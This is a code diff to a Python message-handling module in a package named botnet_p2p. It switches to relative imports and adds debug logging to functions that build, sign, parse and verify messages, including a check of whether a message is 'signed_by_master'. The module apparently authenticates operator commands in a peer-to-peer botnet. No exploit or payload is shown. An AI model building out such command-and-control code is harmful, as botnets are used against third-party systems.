@@ -1,17 +1,18 @@
 """Basic message manipulation"""
 
-from botnet_p2p import (
+from . import (
     ENCODING,
     MSG_SEPARATOR,
     DEFAULT_INT,
     logger,
 )
 
-from botnet_p2p.security import (
+from .security import (
     calculate_hash,
     sign_hash,
     verify_message,
 )
+
 
 
 def structure_msg(msg_info: dict) -> bytes:
@@ -34,6 +35,9 @@ def structure_msg(msg_info: dict) -> bytes:
         builded_msg += MSG_SEPARATOR + sign
     builded_msg_encoded = builded_msg.encode(ENCODING)
 
+    logger.debug(f"Message info is {msg_info}")
+    logger.debug(f"The resulting message is {builded_msg_encoded}")
+
     return builded_msg_encoded
 
 
@@ -42,6 +46,9 @@ def sign_structured_msg(msg: bytes, private_key_path: str) -> bytes:
     msg_hash = calculate_hash(msg_to_sign)
     sign = sign_hash(msg_hash, private_key_path)
     signed_msg = __append(sign, msg)
+
+    logger.debug(f"Message is {msg}")
+    logger.debug(f"Signed message is {signed_msg}")
 
     return signed_msg
 
@@ -55,18 +62,22 @@ def __get_msg_and_type(msg: bytes) -> bytes:
     else:
         msg_to_sign = separator_encoded.join(splitted_msg[2:4])
 
+    logger.debug(f"From message {msg}")
+    logger.debug(f"This is the part to sign {msg_to_sign}")
+
     return msg_to_sign
 
 
 def __append(this: bytes, to: bytes) -> bytes:
     signed_msg = to + MSG_SEPARATOR.encode(ENCODING) + this
+    logger.debug(f"Append {to} to {this}")
+    logger.debug(f"Result {signed_msg}")
 
     return signed_msg
 
 
 def signed_by_master(msg: bytes, public_key_path: str) -> bool:
     signed_msg_part = __get_msg_and_type(msg)
-    logger.debug(f"Type and msg = {signed_msg_part}")
     signed_hash = __get_signed_hash(msg)
     veredict = verify_message(public_key_path, signed_msg_part, signed_hash)
 
@@ -75,6 +86,7 @@ def signed_by_master(msg: bytes, public_key_path: str) -> bool:
 
 def __get_signed_hash(msg: bytes) -> bytes:
     signed_hash = msg.split(MSG_SEPARATOR.encode(ENCODING))[-1]
+    logger.debug(f"{msg} hash is {signed_hash}")
 
     return signed_hash
 
@@ -94,5 +106,6 @@ def breakdown_msg(msg: bytes) -> dict:
         "msg": info[3],
         "sign": info[4],
     }
+    logger.debug(f"From message {msg} info {msg_info}")
 
     return msg_info
